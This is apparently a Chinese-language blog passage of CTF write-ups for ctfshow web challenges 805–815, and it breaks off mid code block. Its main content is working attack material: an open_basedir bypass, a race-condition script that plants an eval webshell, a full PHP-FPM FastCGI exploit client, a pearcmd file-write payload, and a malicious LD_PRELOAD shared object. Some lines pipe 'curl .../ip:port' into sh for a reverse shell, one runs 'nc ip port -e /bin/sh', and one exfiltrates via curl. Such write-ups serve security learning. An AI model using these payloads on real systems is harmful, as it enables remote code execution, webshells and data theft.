<p>open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。</p>
<p>假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。</p>
<p>注意：用open_basedir指定的<strong>限制实际上是前缀，而不是目录名</strong>。</p>
<p>可以利用glob协议先遍历目录</p>
<pre class="language-php" data-language="php"><code class="language-php">$a &#x3D; &quot;glob:&#x2F;&#x2F;&#x2F;*&quot;;
  if ( $b &#x3D; opendir($a) ) &#123;
    while ( ($file &#x3D; readdir($b)) !&#x3D;&#x3D; false ) &#123;
      echo $file.&quot;\n&quot;;
    &#125;
    closedir($b);
  &#125;</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524165320388.png" alt="image-20220524165320388"></p>
<p>然后利用chdir和mkdir读取</p>
<pre class="language-sh" data-language="sh"><code class="language-sh">mkdir(&quot;s&quot;);
chdir(&#39;s&#39;);
ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);
echo file_get_contents(&quot;&#x2F;ctfshowflag&quot;);</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524182720886.png" alt="image-20220524182720886"></p>
<p><strong>另外还有一种利用p神脚本的方式</strong></p>
<p>脚本懒得贴了，主要就是，别用php当后缀，不然脚本不知道为什么接收不了靶机上的参数，只会执行你自己vps上的内容，要不然就要写个flask当跳板。（花了一天的血的教训</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525182618874.png" alt="image-20220525182618874"></p>
<p>flask的内容</p>
<pre class="language-python" data-language="python"><code class="language-python">from flask import Flask
app &#x3D; Flask(__name__)

@app.route(&#39;&#x2F;&#39;)
def hello_world():

    with open(&#39;opendir.php&#39;,&#39;r&#39;) as f:
        pay &#x3D; f.read()
    return pay
    
if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    app.run(host&#x3D;&quot;0.0.0.0&quot;, port&#x3D;int(&quot;5001&quot;), debug&#x3D;True)
</code></pre>

<p>在vps上开起来然后文件包含</p>
<h2 id="web806"><a href="#web806" class="headerlink" title="web806"></a>web806</h2><p><strong>php无参RCE</strong></p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php

highlight_file(__FILE__);

if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    
    eval($_GET[&#39;code&#39;]);
&#125;
?&gt;
</code></pre>

<p>经典无参rce，百度找一堆payload</p>
<p><a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE · sky&#39;s blog (skysec.top)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45570082/article/details/106602261">无参数rce_名字被抢的Stars的博客-CSDN博客_无参数rce</a></p>
<p><a target="_blank" rel="noopener" href="https://hetian.blog.csdn.net/article/details/107171940?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2-107171940-blog-105237550.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2-107171940-blog-105237550.pc_relevant_default&amp;utm_relevant_index=5">https://hetian.blog.csdn.net/article/details/107171940?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2-107171940-blog-105237550.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2-107171940-blog-105237550.pc_relevant_default&amp;utm_relevant_index=5</a></p>
<p><code>var_dump(scandir(dirname(dirname(dirname(getcwd())))));</code>读上级目录</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524183248018.png" alt="image-20220524183248018"></p>
<p>用这种函数构造的方法根目录文件不是很好读，主要是还要构造一个斜杠</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">if(chdir(chr(ord(strrev(crypt(serialize(array())))))))show_source(array_rand(array_flip(scandir(getcwd()))));</code></pre>

<p>写个脚本看运气读吧</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524190821873.png" alt="image-20220524190821873"></p>
<h2 id="web807"><a href="#web807" class="headerlink" title="web807"></a>web807</h2><p><strong>反弹shell</strong></p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
    
error_reporting(0);
highlight_file(__FILE__);
$url &#x3D; $_GET[&#39;url&#39;];

$schema &#x3D; substr($url,0,8);

if($schema&#x3D;&#x3D;&#x3D;&quot;https:&#x2F;&#x2F;&quot;)&#123;
    shell_exec(&quot;curl $url&quot;);
&#125;
</code></pre>

<p>拿一下群主搭的网站</p>
<p><a target="_blank" rel="noopener" href="https://your-shell.com/">https://your-shell.com/</a></p>
<p>后边带上ip和端口带个sh命令就能直接反弹shell了</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524204159380.png" alt="image-20220524204159380"></p>
<p>或者可以利用像dnslog外带那种</p>
<p>payload</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">https:&#x2F;&#x2F;;curl ip:port?a&#x3D;&#96;ls&#96;</code></pre>

<h2 id="web808"><a href="#web808" class="headerlink" title="web808"></a>web808</h2><p><strong>卡临时文件包含</strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/106498971">PHP LFI 利用临时文件 Getshell 姿势_WHOAMIAnony的博客-CSDN博客_phpinfo拿shell</a></p>
<p><code>include &#39;php://filter/string.strip_tags/resource=/etc/passwd&#39;;</code></p>
<p>这段代码会导致php进程的崩溃而让我们的临时文件留在临时文件目录下不会被删除</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php

error_reporting(0);
$file &#x3D; $_GET[&#39;file&#39;];


if(isset($file) &amp;&amp; !preg_match(&quot;&#x2F;input|data|phar|log&#x2F;i&quot;,$file))&#123;
    include $file;
&#125;else&#123;
    show_source(__FILE__);
    print_r(scandir(&quot;&#x2F;tmp&quot;));
&#125;
</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524210412095.png" alt="image-20220524210412095"></p>
<p>用这段代码上传就行</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524210438734.png" alt="image-20220524210438734"></p>
<p>然后包含一下我们的临时文件就能getshell了</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524210616382.png" alt="image-20220524210616382"></p>
<p>还有一种利用session条件竞争来写马的方法</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/288430.html">【文件包含&amp;条件竞争】详解如何利用session.upload_progress文件包含进行... - FreeBuf网络安全行业门户</a></p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
import io
import threading

url &#x3D; &quot;http:&#x2F;&#x2F;192.168.2.128&#x2F;test.php&quot;
sessid &#x3D; &quot;Lxxx&quot;

def write(session):
filebytes &#x3D; io.BytesIO(b&#39;a&#39; * 1024 * 50)
while True:
res &#x3D; session.post(url,
data&#x3D;&#123;
&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &quot;&lt;?php eval($_POST[1]);?&gt;&quot;
&#125;,
cookies&#x3D;&#123;
&#39;PHPSESSID&#39;: sessid
&#125;,
files&#x3D;&#123;
&#39;file&#39;: (&#39;Lxxx.jpg&#39;, filebytes)
&#125;
)

def read(session):
while True:
res &#x3D; session.post(url+&quot;?a&#x3D;&#x2F;tmp&#x2F;sess_&quot;+sessid,
data&#x3D;&#123;
&quot;1&quot;:&quot;file_put_contents(&#39;&#x2F;www&#x2F;admin&#x2F;localhost_80&#x2F;wwwroot&#x2F;1.php&#39; , &#39;&lt;?php eval($_POST[2]);?&gt;&#39;);&quot;
&#125;,
cookies&#x3D;&#123;
&quot;PHPSESSID&quot;:sessid
&#125;
)
res2 &#x3D; session.get(&quot;http:&#x2F;&#x2F;192.168.2.128&#x2F;1.php&quot;)
if res2.status_code &#x3D;&#x3D; 200:
print(&quot;成功写入一句话！&quot;)
else:
print(&quot;Retry&quot;)



if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
evnet &#x3D; threading.Event()
with requests.session() as session:
for i in range(5):
threading.Thread(target&#x3D;write, args&#x3D;(session,)).start()
for i in range(5):
threading.Thread(target&#x3D;read, args&#x3D;(session,)).start()
evnet.set()</code></pre>

<h2 id="web809"><a href="#web809" class="headerlink" title="web809"></a>web809</h2><p><strong>pear文件包含RCE</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45751765/article/details/121628030?ops_request_misc=%7B%22request_id%22:%22164994550016782089359874%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=164994550016782089359874&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2blogfirst_rank_ecpm_v1~rank_v31_ecpm-1-121628030.nonecase&utm_term=pear&spm=1018.2226.3001.4450">HXBCTF 2021]湖湘杯easywill_k_du1t的博客-CSDN博客</a></p>
<blockquote>
<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p>
<p>不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
</blockquote>
<p>利用条件：register_argc_argv开启</p>
<p>当开启了这个选项，用户的输入将会被赋予给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER[&#39;argv&#39;]</code>几个变量。</p>
<blockquote>
<p>‘argv’<br>传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。</p>
</blockquote>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524211826336.png" alt="image-20220524211826336"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524212116036.png" alt="image-20220524212116036"></p>
<p>我们的可以利用pear中的config-create命令，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>
<blockquote>
<p>index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<?=phpinfo()?>+/tmp/hello.php</p>
<p>目标将会写入一个文件<code>/tmp/hello.php</code>，其内容包含<code>&lt;?=phpinfo()?&gt;</code>：</p>
</blockquote>
<p>用bp发包把我们的一句话木马写进去，然后访问就行</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524213125023.png" alt="image-20220524213125023"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524213116263.png" alt="image-20220524213116263"></p>
<h2 id="web810"><a href="#web810" class="headerlink" title="web810"></a>web810</h2><p><strong>SSRF打PHP-FPM</strong></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524233127483.png" alt="image-20220524233127483"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524233113854.png" alt="image-20220524233113854"></p>
<h2 id="web811"><a href="#web811" class="headerlink" title="web811"></a>web811</h2><p><strong>file_put_contents打PHP-FPM</strong></p>
<p>参考陇原战役的复现</p>
<p>有点要注意的是这里用bash弹不出来，要用nc ip port -e /bin/sh</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524225414567.png" alt="image-20220524225414567"></p>
<h2 id="web812"><a href="#web812" class="headerlink" title="web812"></a>web812</h2><p><strong>PHP-FPM未授权</strong></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
</blockquote>
<p>PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525193643081.png" alt="image-20220525193643081"></p>
<p>可以结合php安装时带的php文件来执行</p>
<p>例如/usr/local/lib/php/OS/Guess.php</p>
<p>脚本</p>
<pre class="language-php" data-language="php"><code class="language-php">import socket
import random
import argparse
import sys
from io import BytesIO

# Referrer: https:&#x2F;&#x2F;github.com&#x2F;wuyunfeng&#x2F;Python-FastCGI-Client

PY2 &#x3D; True if sys.version_info.major &#x3D;&#x3D; 2 else False


def bchr(i):
    if PY2:
        return force_bytes(chr(i))
    else:
        return bytes([i])

def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)

def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode(&#39;utf-8&#39;, &#39;strict&#39;)

def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s &#x3D; str(s, &#39;utf-8&#39;, &#39;strict&#39;)
    else:
        s &#x3D; str(s)
    return s


class FastCGIClient:
    &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;

    # private
    __FCGI_VERSION &#x3D; 1

    __FCGI_ROLE_RESPONDER &#x3D; 1
    __FCGI_ROLE_AUTHORIZER &#x3D; 2
    __FCGI_ROLE_FILTER &#x3D; 3

    __FCGI_TYPE_BEGIN &#x3D; 1
    __FCGI_TYPE_ABORT &#x3D; 2
    __FCGI_TYPE_END &#x3D; 3
    __FCGI_TYPE_PARAMS &#x3D; 4
    __FCGI_TYPE_STDIN &#x3D; 5
    __FCGI_TYPE_STDOUT &#x3D; 6
    __FCGI_TYPE_STDERR &#x3D; 7
    __FCGI_TYPE_DATA &#x3D; 8
    __FCGI_TYPE_GETVALUES &#x3D; 9
    __FCGI_TYPE_GETVALUES_RESULT &#x3D; 10
    __FCGI_TYPE_UNKOWNTYPE &#x3D; 11

    __FCGI_HEADER_SIZE &#x3D; 8

    # request state
    FCGI_STATE_SEND &#x3D; 1
    FCGI_STATE_ERROR &#x3D; 2
    FCGI_STATE_SUCCESS &#x3D; 3

    def __init__(self, host, port, timeout, keepalive):
        self.host &#x3D; host
        self.port &#x3D; port
        self.timeout &#x3D; timeout
        if keepalive:
            self.keepalive &#x3D; 1
        else:
            self.keepalive &#x3D; 0
        self.sock &#x3D; None
        self.requests &#x3D; dict()

    def __connect(self):
        self.sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # if self.keepalive:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
        # else:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
        try:
            self.sock.connect((self.host, int(self.port)))
        except socket.error as msg:
            self.sock.close()
            self.sock &#x3D; None
            print(repr(msg))
            return False
        return True

    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length &#x3D; len(content)
        buf &#x3D; bchr(FastCGIClient.__FCGI_VERSION) \
               + bchr(fcgi_type) \
               + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \
               + bchr(requestid &amp; 0xFF) \
               + bchr((length &gt;&gt; 8) &amp; 0xFF) \
               + bchr(length &amp; 0xFF) \
               + bchr(0) \
               + bchr(0) \
               + content
        return buf

    def __encodeNameValueParams(self, name, value):
        nLen &#x3D; len(name)
        vLen &#x3D; len(value)
        record &#x3D; b&#39;&#39;
        if nLen &lt; 128:
            record +&#x3D; bchr(nLen)
        else:
            record +&#x3D; bchr((nLen &gt;&gt; 24) | 0x80) \
                      + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \
                      + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \
                      + bchr(nLen &amp; 0xFF)
        if vLen &lt; 128:
            record +&#x3D; bchr(vLen)
        else:
            record +&#x3D; bchr((vLen &gt;&gt; 24) | 0x80) \
                      + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \
                      + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \
                      + bchr(vLen &amp; 0xFF)
        return record + name + value

    def __decodeFastCGIHeader(self, stream):
        header &#x3D; dict()
        header[&#39;version&#39;] &#x3D; bord(stream[0])
        header[&#39;type&#39;] &#x3D; bord(stream[1])
        header[&#39;requestId&#39;] &#x3D; (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])
        header[&#39;contentLength&#39;] &#x3D; (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])
        header[&#39;paddingLength&#39;] &#x3D; bord(stream[6])
        header[&#39;reserved&#39;] &#x3D; bord(stream[7])
        return header

    def __decodeFastCGIRecord(self, buffer):
        header &#x3D; buffer.read(int(self.__FCGI_HEADER_SIZE))

        if not header:
            return False
        else:
            record &#x3D; self.__decodeFastCGIHeader(header)
            record[&#39;content&#39;] &#x3D; b&#39;&#39;
            
            if &#39;contentLength&#39; in record.keys():
                contentLength &#x3D; int(record[&#39;contentLength&#39;])
                record[&#39;content&#39;] +&#x3D; buffer.read(contentLength)
            if &#39;paddingLength&#39; in record.keys():
                skiped &#x3D; buffer.read(int(record[&#39;paddingLength&#39;]))
            return record

    def request(self, nameValuePairs&#x3D;&#123;&#125;, post&#x3D;&#39;&#39;):
        if not self.__connect():
            print(&#39;connect failure! please check your fasctcgi-server !!&#39;)
            return

        requestId &#x3D; random.randint(1, (1 &lt;&lt; 16) - 1)
        self.requests[requestId] &#x3D; dict()
        request &#x3D; b&quot;&quot;
        beginFCGIRecordContent &#x3D; bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord &#x3D; b&#39;&#39;
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name &#x3D; force_bytes(name)
                value &#x3D; force_bytes(value)
                paramsRecord +&#x3D; self.__encodeNameValueParams(name, value)

        if paramsRecord:
            request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#39;&#39;, requestId)

        if post:
            request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#39;&#39;, requestId)

        self.sock.send(request)
        self.requests[requestId][&#39;state&#39;] &#x3D; FastCGIClient.FCGI_STATE_SEND
        self.requests[requestId][&#39;response&#39;] &#x3D; b&#39;&#39;
        return self.__waitForResponse(requestId)

    def __waitForResponse(self, requestId):
        data &#x3D; b&#39;&#39;
        while True:
            buf &#x3D; self.sock.recv(512)
            if not len(buf):
                break
            data +&#x3D; buf

        data &#x3D; BytesIO(data)
        while True:
            response &#x3D; self.__decodeFastCGIRecord(data)
            if not response:
                break
            if response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDOUT \
                    or response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDERR:
                if response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDERR:
                    self.requests[&#39;state&#39;] &#x3D; FastCGIClient.FCGI_STATE_ERROR
                if requestId &#x3D;&#x3D; int(response[&#39;requestId&#39;]):
                    self.requests[requestId][&#39;response&#39;] +&#x3D; response[&#39;content&#39;]
            if response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.FCGI_STATE_SUCCESS:
                self.requests[requestId]
        return self.requests[requestId][&#39;response&#39;]

    def __repr__(self):
        return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)


if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;Php-fpm code execution vulnerability client.&#39;)
    parser.add_argument(&#39;host&#39;, help&#x3D;&#39;Target host, such as 127.0.0.1&#39;)
    parser.add_argument(&#39;file&#39;, help&#x3D;&#39;A php file absolute path, such as &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;System.php&#39;)
    parser.add_argument(&#39;-c&#39;, &#39;--code&#39;, help&#x3D;&#39;What php code your want to execute&#39;, default&#x3D;&#39;&lt;?php phpinfo(); exit; ?&gt;&#39;)
    parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, help&#x3D;&#39;FastCGI port&#39;, default&#x3D;9000, type&#x3D;int)

    args &#x3D; parser.parse_args()

    client &#x3D; FastCGIClient(args.host, args.port, 3, 0)
    params &#x3D; dict()
    documentRoot &#x3D; &quot;&#x2F;&quot;
    uri &#x3D; args.file
    content &#x3D; args.code
    params &#x3D; &#123;
        &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,
        &#39;REQUEST_METHOD&#39;: &#39;POST&#39;,
        &#39;SCRIPT_FILENAME&#39;: documentRoot + uri.lstrip(&#39;&#x2F;&#39;),
        &#39;SCRIPT_NAME&#39;: uri,
        &#39;QUERY_STRING&#39;: &#39;&#39;,
        &#39;REQUEST_URI&#39;: uri,
        &#39;DOCUMENT_ROOT&#39;: documentRoot,
        &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,
        &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,
        &#39;REMOTE_PORT&#39;: &#39;9985&#39;,
        &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,
        &#39;SERVER_PORT&#39;: &#39;80&#39;,
        &#39;SERVER_NAME&#39;: &quot;localhost&quot;,
        &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;,
        &#39;CONTENT_TYPE&#39;: &#39;application&#x2F;text&#39;,
        &#39;CONTENT_LENGTH&#39;: &quot;%d&quot; % len(content),
        &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;,
        &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;
    &#125;
    response &#x3D; client.request(params, content)
    print(force_text(response))
</code></pre>

<p>用法：<br><code>python exp.py -c &#39;&lt;?php system(&quot;cat /f*&quot;);?&gt;&#39; -p 28074 pwn.challenge.ctf.show /usr/local/lib/php/PEAR.php</code></p>
<p>端口改成自己的就行</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525195637988.png" alt="image-20220525195637988"></p>
<h2 id="web813"><a href="#web813" class="headerlink" title="web813"></a>web813</h2><p><strong>劫持mysqli</strong></p>
<blockquote>
<p>大致过程就是自己生成一个mysqli.so（mysqli的扩展），然后扩展里面有ctfshow这个函数。<br>题目调用ctfshow函数的时候就会去扩展里面找（php里面没有这个函数）。<br>可以采用<a target="_blank" rel="noopener" href="https://www.php.net/releases/">php源码</a>中的<code>ext_skel.php</code>来生成。<br>一般在ext目录下。</p>
</blockquote>
<p>phpinfo中可以看默认扩展目录</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525214350144.png" alt="image-20220525214350144"></p>
<p>当php调用函数时，如果在注册函数中找不到就会去扩展目录中找<br>此时我们上传恶意so文件可以劫持函数</p>
<p><strong>恶意so为什么能绕过disable_function</strong></p>
<p>php disable_function禁用的是php函数，而恶意so中调用的是C语言库中的system函数</p>
<p><strong>编译so文件</strong></p>
<p><strong>ext_skel框架开发扩展</strong></p>
<p>ubuntu用apt按的话默认不安装，要自己按</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/DestinyLordC/article/details/79479769">https://blog.csdn.net/DestinyLordC/article/details/79479769</a></p>
<p>php ext_skel.php --ext ctfshow --std</p>
<p>在ctfshow.c里改两个地方</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525225654446.png" alt="image-20220525225654446"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525224854116.png" alt="image-20220525224854116"></p>
<pre class="language-txt" data-language="txt"><code class="language-txt">phpize
.&#x2F;configure
make &amp;&amp; make install </code></pre>

<p>编译完成后能看见目录，也能在目录里看见我们编译好的so文件</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525230440261.png" alt="image-20220525230440261"></p>
<p>太怪了，没成功，有空再试吧</p>
<p><strong>利用条件</strong></p>
<p>1.扩展目录明确且可写</p>
<p>2.能够载入恶意so文件（重启php-fpm或者能使用php命令行）</p>
<p>3.有调用我们自定义函数的代码 shell_exec(&quot;php -r &#39;ctfshow();&#39; &quot;)</p>
<h2 id="web814"><a href="#web814" class="headerlink" title="web814"></a>web814</h2><p><strong>劫持getuid</strong></p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);

$action &#x3D; $_GET[&#39;a&#39;];
switch ($action) &#123;
    case &#39;phpinfo&#39;:
        phpinfo();
        break;
    
    case &#39;write&#39;:
        file_put_contents($_POST[&#39;file&#39;],$_POST[&#39;content&#39;]);
        break;

    case &#39;run&#39;:
        putenv($_GET[&#39;env&#39;]);
        system(&quot;whoami&quot;);
        break;

    default:
        highlight_file(__FILE__);
        break;
&#125;</code></pre>

<p><strong>在php中，可使用putenv()函数设置LD_PRELOAD环境变量来加载指定的so文件，so文件中包含自定义函数进行劫持从而达到执行恶意命令的目的</strong></p>
<p>php启动<strong>新进程</strong>时，调用getuid来确认 进程属主(执行权限）</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254388">有趣的 LD_PRELOAD - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://download.qingteng.cn/frontendcdn/2019/06/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-%E7%BB%95%E8%BF%87php%E7%9A%84disable_functions%EF%BC%88%E4%B8%8A%E7%AF%87%EF%BC%89.pdf">安全研究-绕过php的disable_functions（上篇）.pdf (qingteng.cn)</a></p>
<p>有下面这几个函数的时候就可以考虑利用LD_PRELOAD进行绕过disable_function</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526170114684.png" alt="image-20220526170114684"></p>
<p>编译同名函数进行劫持<br>注意进行unset(LD_PERLOAD)<br>避免进入死循环</p>
<pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void payload() &#123;
    system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;ip:port |sh&quot;);
&#125;

uid_t getuid() &#123;
    if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123;
        return 0;
    &#125;
    unsetenv(&quot;LD_PRELOAD&quot;);
    payload();
&#125;


#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
void payload()&#123;
        system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;ip:port |sh&quot;);
&#125;
int getuid()
&#123;
        if(getenv(&quot;LD_PRELOAD&quot;)&#x3D;&#x3D;NULL)&#123; return 0;&#125;
        unsetenv(&quot;LD_PRELOAD&quot;);
        payload();
&#125;

</code></pre>

<p>gcc -shared -fPIC getuid.c -o getuid.so </p>
<p>然后上脚本</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
url&#x3D;&quot;http:&#x2F;&#x2F;5fce36f5-6270-4ea7-ac06-2ab0c6e1cd5a.challenge.ctf.show&#x2F;&quot;
data&#x3D;&#123;&#39;file&#39;:&#39;&#x2F;tmp&#x2F;getuid.so&#39;,&#39;content&#39;:open(&#39;getuid.so&#39;,&#39;rb&#39;).read()&#125;
requests.post(url+&#39;?a&#x3D;write&#39;,data&#x3D;data)
requests.get(url+&#39;?a&#x3D;run&amp;env&#x3D;LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;getuid.so&#39;)</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526165856011.png" alt="image-20220526165856011"></p>
<h2 id="web815"><a href="#web815" class="headerlink" title="web815"></a>web815</h2><p><strong>劫持构造器</strong></p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);

$action &#x3D; $_GET[&#39;a&#39;];
switch ($action) &#123;
    case &#39;phpinfo&#39;:
        phpinfo();
        break;
    
    case &#39;write&#39;:
        file_put_contents($_POST[&#39;file&#39;],$_POST[&#39;content&#39;]);
        break;

    case &#39;run&#39;:
        putenv($_GET[&#39;env&#39;]);
        mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
        break;

    default:
        highlight_file(__FILE__);
        break;
&#125;</code></pre>

<p>也可以用814的方法</p>
<p>但是这题是要用这种</p>
<pre class="language-c" data-language="c"><code class="language-c">#define _GNU_SOURCE
